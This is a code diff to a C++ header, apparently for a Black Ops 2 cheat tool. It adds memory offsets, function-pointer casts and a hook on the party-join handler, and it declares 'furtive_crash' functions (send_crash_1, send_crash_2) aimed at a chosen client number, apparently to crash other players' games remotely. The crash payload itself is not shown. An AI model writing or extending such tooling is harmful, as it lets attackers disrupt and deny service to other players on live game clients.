@@ -282,6 +282,11 @@ public:
 		return this->session;
 	}
 
+	int party_id() const
+	{
+		return *reinterpret_cast<int*>(reinterpret_cast<std::uintptr_t>(this) + 0x95C4);
+	}
+
     bool is_running() const
 	{
 		return *reinterpret_cast<int*>(reinterpret_cast<std::uintptr_t>(this) + 0x9590) == 1;
@@ -309,30 +314,54 @@ namespace t6
         constexpr auto g_partyData = 0x12B2308;
 	    constexpr auto g_lobbyData = 0x12A7000;
 
-		const auto Party_GetPartyData = ProtoGenesys::bIsSteamVersion ? 0x548CF0 : 0x615150;
 		const auto atoi_CL_HandleRelayPacketCall = ProtoGenesys::bIsSteamVersion ? 0x7EB870 : 0x7EC480;
+		const auto MSG_ReadByte_PartyHost_HandleJoinPartyRequestCall = ProtoGenesys::bIsSteamVersion ? 0x7F8677 : 0x7F94E7;
+
+		const auto Session_GetCurrentSession = ProtoGenesys::bIsSteamVersion ? 0x4823F0 : 0x534520;
+		const auto Party_GetPartyData = ProtoGenesys::bIsSteamVersion ? 0x548CF0 : 0x615150;
+		const auto Party_FindMemberByXUID = ProtoGenesys::bIsSteamVersion ? 0x673F60 : 0x51AD60;
 
 	    const auto MSG_Init = ProtoGenesys::bIsSteamVersion ? 0x69D900 : 0x465E60;
         const auto MSG_WriteString = ProtoGenesys::bIsSteamVersion ? 0x623EC0 : 0x630CF0;
+		const auto MSG_WriteLong = ProtoGenesys::bIsSteamVersion ? 0x41AB90 : 0x473240;
+		const auto MSG_WriteInt64 = ProtoGenesys::bIsSteamVersion ? 0x65A2B0 : 0x558E30;
+		const auto MSG_WriteByte = ProtoGenesys::bIsSteamVersion ? 0x4D0500 : 0x415940;
+		const auto MSG_WriteShort = ProtoGenesys::bIsSteamVersion ? 0x6C2370 : 0x4677A0;
+		const auto MSG_WriteFloat = ProtoGenesys::bIsSteamVersion ? 0x6F3D70 : 0x6B8A40;
+		const auto MSG_WriteBit1 = ProtoGenesys::bIsSteamVersion ? 0x6F59F0 : 0x44EB30;
+		const auto MSG_WriteBit0 = ProtoGenesys::bIsSteamVersion ? 0x520880 : 0x55C990;
+		const auto MSG_ReadByte = ProtoGenesys::bIsSteamVersion ? 0x6E07B0 : 0x6D4170;
+
+		const auto Com_ControllerIndex_GetNetworkID = ProtoGenesys::bIsSteamVersion ? 0x49E3F0 : 0x4DC750;
 	    const auto NET_OutOfBandData = ProtoGenesys::bIsSteamVersion ? 0x706EC0 : 0x45C230;
 
 		const auto CL_SendPeerData = ProtoGenesys::bIsSteamVersion ? 0x6642E0 : 0x51FA60;
-		const auto MSG_WriteByte = ProtoGenesys::bIsSteamVersion ? 0x4D0500 : 0x415940;
 		const auto CL_CanWeConnectToClient = ProtoGenesys::bIsSteamVersion ? 0x697EF0 : 0x639CF0;
-		const auto Party_FindMemberByXUID = ProtoGenesys::bIsSteamVersion ? 0x673F60 : 0x51AD60;
+
 		const auto Live_GetXuid = ProtoGenesys::bIsSteamVersion ? 0x54FBD0 : 0x4EA8C0;
     }
 
+	const static auto Session_GetCurrentSession = reinterpret_cast<SessionData*(*)()>(offsets::Session_GetCurrentSession);
 	const static auto Party_GetPartyData = reinterpret_cast<PartyData_s*(*)()>(offsets::Party_GetPartyData);
+	const static auto Party_FindMemberByXUID = reinterpret_cast<int(*)(PartyData_s * party, std::uint64_t player)>(offsets::Party_FindMemberByXUID);
 
     const static auto MSG_Init = reinterpret_cast<void(*)(msg_t * buf, char* data, int length)>(offsets::MSG_Init);
 	const static auto MSG_WriteString = reinterpret_cast<void(*)(msg_t * sb, const char* s)>(offsets::MSG_WriteString);
+	const static auto MSG_WriteLong = reinterpret_cast<void(*)(msg_t * msg, int c)>(offsets::MSG_WriteLong);
+	const static auto MSG_WriteInt64 = reinterpret_cast<void(*)(msg_t * msg, std::uint64_t c)>(offsets::MSG_WriteInt64);
+	const static auto MSG_WriteByte = reinterpret_cast<void(*)(msg_t * msg, int c)>(offsets::MSG_WriteByte);
+	const static auto MSG_WriteShort = reinterpret_cast<void(*)(msg_t * msg, int c)>(offsets::MSG_WriteShort);
+	const static auto MSG_WriteFloat = reinterpret_cast<void(*)(msg_t * msg, float f)>(offsets::MSG_WriteFloat);
+	const static auto MSG_WriteBit1 = reinterpret_cast<void(*)(msg_t * msg)>(offsets::MSG_WriteBit1);
+	const static auto MSG_WriteBit0 = reinterpret_cast<void(*)(msg_t * msg)>(offsets::MSG_WriteBit0);
+	const static auto MSG_ReadByte = reinterpret_cast<int(*)(msg_t * msg)>(offsets::MSG_ReadByte);
+
+	const static auto Com_ControllerIndex_GetNetworkID = reinterpret_cast<netsrc_t(*)(ControllerIndex_t controllerIndex)>(offsets::Com_ControllerIndex_GetNetworkID);
 	const static auto NET_OutOfBandData = reinterpret_cast<bool(*)(netsrc_t sock, netadr_t adr, const char* format, int len)>(offsets::NET_OutOfBandData);
 
 	const static auto CL_SendPeerData = reinterpret_cast<bool(*)(void* sessionData, int localClientNum, netsrc_t sock, int clientNum, msg_t * msg, int dataType)>(offsets::CL_SendPeerData);
-	const static auto MSG_WriteByte = reinterpret_cast<void(*)(msg_t * msg, int c)>(offsets::MSG_WriteByte);
 	const static auto CL_CanWeConnectToClient = reinterpret_cast<int(*)(void* sessionData, int ourClientNum, int theirClientNum)>(offsets::CL_CanWeConnectToClient);
-	const static auto Party_FindMemberByXUID = reinterpret_cast<int(*)(PartyData_s * party, std::uint64_t player)>(offsets::Party_FindMemberByXUID);
+
 	const static auto Live_GetXuid = reinterpret_cast<std::uint64_t(*)(ControllerIndex_t controllerIndex)>(offsets::Live_GetXuid);
 
     static auto g_partyData = reinterpret_cast<PartyData_s*>(offsets::g_partyData);
@@ -349,11 +378,13 @@ namespace t6
 namespace furtive_crash
 {
     int atoi_CL_HandleRelayPacket(const char* str);
+	int MSG_ReadByte_PartyHost_HandleJoinPartyRequest(msg_t* msg);
 
     void init();
 	void free();
 
-	void send_crash(std::size_t client_num);
+	void send_crash_1(std::size_t client_num);
+	void send_crash_2(std::size_t client_num);
 	bool send_connectivity_test(std::size_t client_num);
 }
 
